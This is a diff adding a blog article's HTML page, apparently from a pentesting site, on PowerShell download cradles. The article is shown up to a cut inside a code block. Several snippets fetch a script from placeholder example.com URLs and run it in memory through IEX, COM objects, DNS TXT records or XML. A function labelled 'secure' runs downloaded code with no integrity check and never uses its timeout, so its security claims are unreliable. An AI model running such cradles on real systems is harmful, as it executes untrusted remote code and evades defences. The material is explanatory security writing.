@@ -1,0 +1,1705 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    
+    <meta name="generator" content="Hugo 0.138.0">
+
+    <script src="js/custom.js"></script>
+    
+
+    
+
+    
+        
+            <meta
+                name="description"
+                content="Bones &amp; All Cyber Security" />
+        
+
+        
+            <meta
+                name="keywords"
+                content="hacking, AD, hack the box, HTB, security, pentesting, cybersecurity, pentester, active-directory" />
+        
+
+        
+            <meta name="author" content="bloodstiller" />
+        
+
+    
+
+
+    <title>
+        
+            Understanding PowerShell Download Cradles: A Deep Dive |
+            Hack the planet
+        
+    </title>
+
+    
+
+
+    
+    
+
+    
+    
+
+
+    
+    
+
+
+    
+    
+
+
+    
+    
+
+    
+
+
+    
+    
+
+    
+
+    
+
+        
+            
+            <link
+                rel="stylesheet"
+                href="/reset.min_6107201571472815285.3662e40c85350bf0bcf308b7db81c173e4b690b862d3c3cde460de5155550bf055b7ff48cddb1cf5255e55f0355196d8dec1d49434b2457842cc77ebea198f3f.css"
+                integrity="sha512-NmLkDIU1C/C88wi324HBc&#43;S2kLhi08PN5GDeUVVVC/BVt/9Izdsc9SVeVfA1UZbY3sHUlDSyRXhCzHfr6hmPPw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/01_layout.5974c097ff194e0a64d31c28fc478cc38b6290fe28d2cc2dbf5ae52a66751db74e4e7374bc4e25f464ea679f74cd86c474a5367e05c2db34a1b9b273466691e0.css"
+                integrity="sha512-WXTAl/8ZTgpk0xwo/EeMw4tikP4o0swtv1rlKmZ1HbdOTnN0vE4l9GTqZ590zYbEdKU2fgXC2zShubJzRmaR4A==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/02_style.8484c853cc558c1c2189842f955ad4be9bf66854698f03f140aef3cfc23174c78eb1ab05b915b7877afac7464e5d70d467c87c1fb3fcbe11a75d379de01e0798.css"
+                integrity="sha512-hITIU8xVjBwhiYQvlVrUvpv2aFRpjwPxQK7zz8IxdMeOsasFuRW3h3r6x0ZOXXDUZ8h8H7P8vhGnXTed4B4HmA==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/03_home.6d64455a82e28b01e58f3c37541add9e36fc8ed87562dac91ff06da3f7f11b32ac1cacaa593b2ab2e01acd894659f66c249bd0a261f051038f19a8734c3e1243.css"
+                integrity="sha512-bWRFWoLiiwHljzw3VBrdnjb8jth1YtrJH/Bto/fxGzKsHKyqWTsqsuAazYlGWfZsJJvQomHwUQOPGahzTD4SQw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/04_responsive.065451199c1e1cd4f86ac1c8733e3c77eaf215b4972cefff7e7929a2837f5b2cc0e0a04f99f34d58e082812d6102c8cc9b358d21db784e9c4d5e5a8c79f4bc43.css"
+                integrity="sha512-BlRRGZweHNT4asHIcz48d&#43;ryFbSXLO//fnkpooN/WyzA4KBPmfNNWOCCgS1hAsjMmzWNIdt4TpxNXlqMefS8Qw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/05_markdown.9afaac6b0a75a2cd9086fb9684dfae53bd04b90e034a252e123a9822c3fa6a5c8a3f88211159b1bd0c6918d19ed7bf3e929ff12de51d06fab0eea77e2374f967.css"
+                integrity="sha512-mvqsawp1os2QhvuWhN&#43;uU70EuQ4DSiUuEjqYIsP6alyKP4ghEVmxvQxpGNGe178&#43;kp/xLeUdBvqw7qd&#43;I3T5Zw==" />
+        
+            
+            <link
+                rel="stylesheet"
+                href="/_theme/css/06_image.ee39fc51345f4c74b8c491bde29d5b2053688d0cc6e937f5660e0f5e3665212473f4cb408cd1749317343308aa41ef1baca3ec3f3aff986ab3764c822790008f.css"
+                integrity="sha512-7jn8UTRfTHS4xJG94p1bIFNojQzG6Tf1Zg4PXjZlISRz9MtAjNF0kxc0MwiqQe8brKPsPzr/mGqzdkyCJ5AAjw==" />
+        
+
+    
+
+
+    
+    
+
+    
+
+    
+
+    
+
+    
+
+
+</head>
+
+
+
+    <body>
+        <header class="header">
+    <div class="header_left">
+        
+    </div>
+
+    <div class="header_middle">
+        
+            Understanding PowerShell Download Cradles: A Deep Dive -
+            Hack the planet
+        
+    </div>
+</header>
+
+
+
+        <main>
+            <aside class="sidebar">
+    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li
+                    
+                        class="dir opened-dir"
+                    >
+                    <span class="dir-text"> Articles </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understandingdownloadcradles/" title="./articles/understandingdownloadcradles/">
+                        
+                            Understanding PowerShell Download Cradles: A Deep Dive
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understanding2023-28252-clfs/" title="./articles/understanding2023-28252-clfs/">
+                        
+                            Understanding CVE-2023-28252: Deep Dive into the CLFS Privilege Escalation Vulnerability
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understandingthemebleedcve-2023-38146/" title="./articles/understandingthemebleedcve-2023-38146/">
+                        
+                            Understanding CVE-2023-38146: Deep Dive into the ThemeBleed Vulnerability
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understandingcupsexploitation/" title="./articles/understandingcupsexploitation/">
+                        
+                            Understanding the CUPS Exploit Chain: A Deep Dive into CVE-2024-4176, CVE-2024-4175, CVE-2024-4177 and CVE-2024-4076
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/understandingnopacexploit/" title="./articles/understandingnopacexploit/">
+                        
+                            Understanding the NoPac Exploit: A Deep Dive into CVE-2021-42278 and CVE-2021-42287
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/seloaddriverprivilegeescalation/" title="./articles/seloaddriverprivilegeescalation/">
+                        
+                            Understanding SeLoadDriverPrivilege Escalation: A Deep Dive
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/azureadconnectattack/" title="./articles/azureadconnectattack/">
+                        
+                            Understanding Azure AD Connect Exploitation &amp; Privilege Escalation
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/shadowcredentialsattack/" title="./articles/shadowcredentialsattack/">
+                        
+                            Understanding the Shadow Credentials Attack Vector
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/articles/deserializationattacksexplained/" title="./articles/deserializationattacksexplained/">
+                        
+                            Understanding .NET Deserialization Exploits: A Deep Dive
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Walkthroughs </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/timelapse-box/" title="./walkthroughs/timelapse-box/">
+                        
+                            Timelapse HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/certified-box/" title="./walkthroughs/certified-box/">
+                        
+                            Certified HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/aero-box/" title="./walkthroughs/aero-box/">
+                        
+                            Aero HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/sauna-box/" title="./walkthroughs/sauna-box/">
+                        
+                            Sauna HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/active-box/" title="./walkthroughs/active-box/">
+                        
+                            Active HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/cicada-box/" title="./walkthroughs/cicada-box/">
+                        
+                            Cicada HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/authority-box/" title="./walkthroughs/authority-box/">
+                        
+                            Authority HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/evilcups-box/" title="./walkthroughs/evilcups-box/">
+                        
+                            EvilCUPS HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/resolute-box/" title="./walkthroughs/resolute-box/">
+                        
+                            Resolute HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/fuse-box/" title="./walkthroughs/fuse-box/">
+                        
+                            Fuse HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/cascade-box/" title="./walkthroughs/cascade-box/">
+                        
+                            Cascade HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/monteverde-box/" title="./walkthroughs/monteverde-box/">
+                        
+                            Monteverde HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/outdated-box/" title="./walkthroughs/outdated-box/">
+                        
+                            Outdated HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/administrator-box/" title="./walkthroughs/administrator-box/">
+                        
+                            Administrator HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/scrambled-box/" title="./walkthroughs/scrambled-box/">
+                        
+                            Scrambled HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/escape-box/" title="./walkthroughs/escape-box/">
+                        
+                            Escape HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/hospital-box/" title="./walkthroughs/hospital-box/">
+                        
+                            Hospital HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/intelligence-box/" title="./walkthroughs/intelligence-box/">
+                        
+                            Intelligence HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/manager-box/" title="./walkthroughs/manager-box/">
+                        
+                            Manager HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/access-box/" title="./walkthroughs/access-box/">
+                        
+                            Access HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/remote-box/" title="./walkthroughs/remote-box/">
+                        
+                            Remote HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/support-box/" title="./walkthroughs/support-box/">
+                        
+                            Support HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/walkthroughs/return-box/" title="./walkthroughs/return-box/">
+                        
+                            Return HTB Walkthrough
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Tools </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/tools/automatingqemukalivm/" title="./tools/automatingqemukalivm/">
+                        
+                            Automating Kali VM Setup with QEMU
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/tools/bloodserver/" title="./tools/bloodserver/">
+                        
+                            BloodServer: A Secure File Transfer Tool for Penetration Testers
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/tools/ldapire/" title="./tools/ldapire/">
+                        
+                            LDAPire: LDAP Enumeration Tool
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li
+                    
+                        class="dir closed-dir"
+                    >
+                    <span class="dir-text"> Cheatsheets </span>
+
+                    
+
+
+
+    
+    
+
+    
+    
+
+
+    <ul class="section-tree">
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/cheatsheets/ldap-cheatsheet/" title="./cheatsheets/ldap-cheatsheet/">
+                        
+                            Attacking LDAP: Deep Dive &amp; Cheatsheet
+                        
+                    </a>
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/cheatsheets/rpc-cheatsheet/" title="./cheatsheets/rpc-cheatsheet/">
+                        
+                            Attacking RPC: Deep Dive &amp; Cheat Sheet
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+                </li>
+            
+        
+            
+                <li class="file">
+                    <a href="http://localhost:1313/aboutme/" title="./aboutme/">
+                        
+                            about me
+                        
+                    </a>
+                </li>
+            
+        
+    </ul>
+
+
+</aside>
+<aside class="exapandable"></aside>
+
+
+            
+    <article class="main">
+        <button
+    class="sidebar-toggle-btn"
+    type="menu"
+    aria-expanded="false"
+    aria-haspopup="true">
+    <i class="bi bi-list"></i>
+</button>
+
+
+
+        <div class="title">
+            <h1 class="title-header">
+                Understanding PowerShell Download Cradles: A Deep Dive
+            </h1>
+
+            <div class="author-date-readtime">
+                
+
+                    
+                        <div class="author" title="Author">
+                            <i class="bi bi-person"></i>
+                            <a
+                                href="/author/bloodstiller/"
+                                class="cat-btn">
+                                bloodstiller
+                            </a>
+                        </div>
+                    
+
+                
+
+                
+                    <div class="date" title="Date">
+                        <i class="bi bi-calendar3"></i>
+                        <time
+                            datetime="2024.11.11"
+                            >2024.11.11
+                        </time>
+                    </div>
+                
+
+                
+                    <div
+                        class="readtime"
+                        title="Time to Read">
+                        <i class="bi bi-clock"></i>
+                        6 mins to read
+                    </div>
+                
+            </div>
+        </div>
+
+        <div class="article-meta">
+            
+
+            
+                <div class="tags">
+                    <i
+                        class="bi bi-tags"
+                        title="Tags"></i>
+                    
+                        <a
+                            href="/tags/windows/"
+                            class="tag-btn">
+                            Windows
+                        </a>
+                    
+                        <a
+                            href="/tags/active-directory/"
+                            class="tag-btn">
+                            Active Directory
+                        </a>
+                    
+                        <a
+                            href="/tags/powershell/"
+                            class="tag-btn">
+                            PowerShell
+                        </a>
+                    
+                        <a
+                            href="/tags/download-cradle/"
+                            class="tag-btn">
+                            Download Cradle
+                        </a>
+                    
+                </div>
+            
+
+            
+                <div class="breadcumb">
+                    <i class="bi bi-folder"></i>
+                    
+    
+    
+
+
+
+
+<a href="http://localhost:1313/" class="bread-btn">
+    
+        <i class="bi bi-house-fill"></i>
+    
+
+    
+        Home
+    
+</a>
+
+
+
+
+    /
+
+
+
+<a href="http://localhost:1313/articles/" class="bread-btn">
+    
+
+    
+        Articles
+    
+</a>
+
+
+
+
+    /
+
+
+
+<a href="http://localhost:1313/articles/understandingdownloadcradles/" class="bread-btn">
+    
+
+    
+        
+            Understanding PowerShell Download Cradles: A Deep Dive
+        
+
+    
+</a>
+
+                </div>
+            
+
+            
+        </div>
+
+        
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#what-is-a-powershell-download-cradle">What is a PowerShell Download Cradle?</a></li>
+    <li><a href="#core-components-and-techniques">Core Components and Techniques</a>
+      <ul>
+        <li><a href="#essential-cmdlets">Essential Cmdlets</a></li>
+        <li><a href="#basic-syntax-example">Basic Syntax Example</a></li>
+      </ul>
+    </li>
+    <li><a href="#common-download-cradle-examples">Common Download Cradle Examples</a>
+      <ul>
+        <li><a href="#basic-webclient-method">Basic WebClient Method</a></li>
+        <li><a href="#com-object-methods">COM Object Methods</a></li>
+        <li><a href="#advanced-techniques">Advanced Techniques</a></li>
+      </ul>
+    </li>
+    <li><a href="#implementation-guide">Implementation Guide</a>
+      <ul>
+        <li><a href="#basic-setup">Basic Setup</a></li>
+        <li><a href="#creating-a-secure-download-cradle">Creating a Secure Download Cradle</a></li>
+      </ul>
+    </li>
+    <li><a href="#real-world-examples-from-hackthebox">Real-World Examples from HackTheBox</a>
+      <ul>
+        <li><a href="#monteverde-machine-running-remote-exploits">Monteverde Machine: Running Remote Exploits</a></li>
+        <li><a href="#certified-box-advanced-mimikatz-usage">Certified Box: Advanced Mimikatz Usage</a></li>
+      </ul>
+    </li>
+    <li><a href="#security-considerations">Security Considerations</a>
+      <ul>
+        <li><a href="#detection-methods">Detection Methods</a></li>
+        <li><a href="#common-restrictions">Common Restrictions</a></li>
+        <li><a href="#defensive-recommendations">Defensive Recommendations</a></li>
+        <li><a href="#legitimate-use-cases">Legitimate Use Cases</a></li>
+      </ul>
+    </li>
+    <li><a href="#best-practices">Best Practices</a>
+      <ul>
+        <li><a href="#code-implementation">Code Implementation</a></li>
+        <li><a href="#security-measures">Security Measures</a></li>
+        <li><a href="#operational-guidelines">Operational Guidelines</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+        
+
+
+        <div class="content">
+            
+                <h2 id="introduction">Introduction</h2>
+<p>PowerShell has revolutionized system administration and automation. One of its powerful yet often misunderstood features is the PowerShell download cradle. This article explores what download cradles are, their uses, and best practices for implementation.</p>
+<h2 id="what-is-a-powershell-download-cradle">What is a PowerShell Download Cradle?</h2>
+<p>A PowerShell download cradle is a technique that enables downloading and executing code directly in memory without writing to disk. This approach can help bypass security mechanisms while providing efficient code execution capabilities.</p>
+<h2 id="core-components-and-techniques">Core Components and Techniques</h2>
+<h3 id="essential-cmdlets">Essential Cmdlets</h3>
+<ul>
+<li><code>Invoke-WebRequest</code>: Retrieves content from web pages</li>
+<li><code>Invoke-Expression</code> (alias: IEX): Executes PowerShell commands from strings</li>
+<li><code>System.Net.WebClient</code>: .NET class for web server interactions</li>
+</ul>
+<h3 id="basic-syntax-example">Basic Syntax Example</h3>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>powershell.exe -NoP -C <span style="color:#e6db74">&#34;IEX(New-Object Net.WebClient).DownloadString(&#39;http://example.com/script.ps1&#39;)&#34;</span></span></span></code></pre></div>
+    
+</div>
+<h2 id="common-download-cradle-examples">Common Download Cradle Examples</h2>
+<h3 id="basic-webclient-method">Basic WebClient Method</h3>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Standard WebClient download cradle</span>
+</span></span><span style="display:flex;"><span>IEX (New-Object Net.Webclient).downloadstring(<span style="color:#e6db74">&#34;https://example.com/script.ps1&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># PowerShell 3.0+ using Invoke-WebRequest (alias: iwr)</span>
+</span></span><span style="display:flex;"><span>IEX (iwr <span style="color:#e6db74">&#39;https://example.com/script.ps1&#39;</span>)</span></span></code></pre></div>
+    
+</div>
+<h3 id="com-object-methods">COM Object Methods</h3>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Internet Explorer COM object</span>
+</span></span><span style="display:flex;"><span>$ie = New-Object -comobject InternetExplorer.Application
+</span></span><span style="display:flex;"><span>$ie.visible = $False
+</span></span><span style="display:flex;"><span>$ie.navigate(<span style="color:#e6db74">&#39;https://example.com/script.ps1&#39;</span>)
+</span></span><span style="display:flex;"><span>start-sleep -s <span style="color:#ae81ff">5</span>
+</span></span><span style="display:flex;"><span>$r = $ie.Document.body.innerHTML
+</span></span><span style="display:flex;"><span>$ie.quit()
+</span></span><span style="display:flex;"><span>IEX $r
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Msxml2.XMLHTTP COM object (proxy-aware)</span>
+</span></span><span style="display:flex;"><span>$h = New-Object -ComObject Msxml2.XMLHTTP
+</span></span><span style="display:flex;"><span>$h.open(<span style="color:#e6db74">&#39;GET&#39;</span>,<span style="color:#e6db74">&#39;https://example.com/script.ps1&#39;</span>,$false)
+</span></span><span style="display:flex;"><span>$h.send()
+</span></span><span style="display:flex;"><span>iex $h.responseText</span></span></code></pre></div>
+    
+</div>
+<h3 id="advanced-techniques">Advanced Techniques</h3>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># DNS TXT Record Method</span>
+</span></span><span style="display:flex;"><span>IEX ([<span style="color:#66d9ef">System.Text.Encoding</span>]::UTF8.GetString([<span style="color:#66d9ef">System.Convert</span>]::FromBase64String(
+</span></span><span style="display:flex;"><span>    ((nslookup -querytype=txt <span style="color:#e6db74">&#34;example.com&#34;</span> | Select -Pattern <span style="color:#e6db74">&#39;&#34;*&#34;&#39;</span>) -split <span style="color:#e6db74">&#39;&#34;&#39;</span>[<span style="color:#ae81ff">0</span>])
+</span></span><span style="display:flex;"><span>)))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># XML Document Method</span>
+</span></span><span style="display:flex;"><span>$a = New-Object System.Xml.XmlDocument
+</span></span><span style="display:flex;"><span>$a.Load(<span style="color:#e6db74">&#34;https://example.com/command.xml&#34;</span>)
+</span></span><span style="display:flex;"><span>$a.command.a.execute | iex</span></span></code></pre></div>
+    
+</div>
+<h2 id="implementation-guide">Implementation Guide</h2>
+<h3 id="basic-setup">Basic Setup</h3>
+<ol>
+<li>Launch PowerShell with appropriate privileges</li>
+<li>Configure execution policy if needed
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="%20%20%20Set-ExecutionPolicy%20RemoteSigned">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>   Set-ExecutionPolicy RemoteSigned</span></span></code></pre></div>
+    
+</div>
+</li>
+</ol>
+<h3 id="creating-a-secure-download-cradle">Creating a Secure Download Cradle</h3>
+<p>When implementing download cradles in a production environment, it&rsquo;s crucial to include proper error handling, logging, and security checks. The following example demonstrates a more robust implementation for in-memory execution:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="function%20Invoke-SecureDownloadCradle%20%7b%0a%20%20%20%20param%20%28%0a%20%20%20%20%20%20%20%20[Parameter%28Mandatory=$true%29][string]%20$Url,%0a%20%20%20%20%20%20%20%20[Parameter%28Mandatory=$false%29][string]%20$UserAgent%20=%20%22PowerShell/SecurityAudit%22,%0a%20%20%20%20%20%20%20%20[Parameter%28Mandatory=$false%29][int]%20$Timeout%20=%2030000%0a%20%20%20%20%29%0a%20%20%20%20%0a%20%20%20%20try%20%7b%0a%20%20%20%20%20%20%20%20#%20Configure%20WebClient%20with%20security%20in%20mind%0a%20%20%20%20%20%20%20%20$webClient%20=%20New-Object%20System.Net.WebClient%0a%20%20%20%20%20%20%20%20$webClient.Headers.Add%28%22User-Agent%22,%20$UserAgent%29%0a%20%20%20%20%20%20%20%20%0a%20%20%20%20%20%20%20%20#%20Enforce%20TLS%201.2%0a%20%20%20%20%20%20%20%20[System.Net.ServicePointManager]::SecurityProtocol%20=%20[System.Net.SecurityProtocolType]::Tls12%0a%20%20%20%20%20%20%20%20%0a%20%20%20%20%20%20%20%20#%20Download%20and%20execute%20in%20memory%0a%20%20%20%20%20%20%20%20$scriptContent%20=%20$webClient.DownloadString%28$Url%29%0a%20%20%20%20%20%20%20%20%0a%20%20%20%20%20%20%20%20#%20Execute%20in%20memory%0a%20%20%20%20%20%20%20%20$ExecutionContext.InvokeCommand.InvokeScript%28$false,%20[scriptblock]::Create%28$scriptContent%29,%20$null,%20$null%29%0a%20%20%20%20%20%20%20%20%0a%20%20%20%20%7d%20catch%20%7b%0a%20%20%20%20%20%20%20%20Write-Error%20%22Download%20cradle%20execution%20failed:%20$_%22%0a%20%20%20%20%7d%20finally%20%7b%0a%20%20%20%20%20%20%20%20$webClient.Dispose%28%29%0a%20%20%20%20%7d%0a%7d">
+                <i class="bi bi-copy"></i>
+            </button>
+        </div>
+    
+
+    
+        <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> Invoke-SecureDownloadCradle {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">param</span> (
+</span></span><span style="display:flex;"><span>        [Parameter(<span style="color:#a6e22e">Mandatory</span>=$true)][<span style="color:#66d9ef">string</span>] $Url,
+</span></span><span style="display:flex;"><span>        [Parameter(<span style="color:#a6e22e">Mandatory</span>=$false)][<span style="color:#66d9ef">string</span>] $UserAgent = <span style="color:#e6db74">&#34;PowerShell/SecurityAudit&#34;</span>,
+</span></span><span style="display:flex;"><span>        [Parameter(<span style="color:#a6e22e">Mandatory</span>=$false)][<span style="color:#66d9ef">int</span>] $Timeout = <span style="color:#ae81ff">30000</span>
+</span></span><span style="display:flex;"><span>    )
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Configure WebClient with security in mind</span>
+</span></span><span style="display:flex;"><span>        $webClient = New-Object System.Net.WebClient
+</span></span><span style="display:flex;"><span>        $webClient.Headers.Add(<span style="color:#e6db74">&#34;User-Agent&#34;</span>, $UserAgent)
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Enforce TLS 1.2</span>
+</span></span><span style="display:flex;"><span>        [<span style="color:#66d9ef">System.Net.ServicePointManager</span>]::SecurityProtocol = [<span style="color:#66d9ef">System.Net.SecurityProtocolType</span>]::Tls12
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Download and execute in memory</span>
+</span></span><span style="display:flex;"><span>        $scriptContent = $webClient.DownloadString($Url)
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Execute in memory</span>
+</span></span><span style="display:flex;"><span>        $ExecutionContext.InvokeCommand.InvokeScript($false, [<span style="color:#66d9ef">scriptblock</span>]::Create($scriptContent), $null, $null)
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> {
+</span></span><span style="display:flex;"><span>        Write-Error <span style="color:#e6db74">&#34;Download cradle execution failed: </span>$_<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">finally</span> {
+</span></span><span style="display:flex;"><span>        $webClient.Dispose()
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div>
+    
+</div>
+<p>This implementation includes several important security features:</p>
+<ul>
+<li>Parameter validation for the URL and optional parameters</li>
+<li>TLS 1.2 enforcement</li>
+<li>Custom User-Agent support for tracking/auditing</li>
+<li>Structured error handling with <code>try/catch</code> blocks</li>
+<li>Proper cleanup with <code>Dispose()</code></li>
+<li>Pure in-memory execution without touching disk</li>
+</ul>
+<p>Example usage:</p>
+
+
+
+
+
+
+
+<div class="codeblock">
+    
+        <div class="copy-button-box">
+            <button class="copy-button" state="copy" data="#ZgotmplZ">
+                <i class="bi bi-copy"></i>
+            </button>
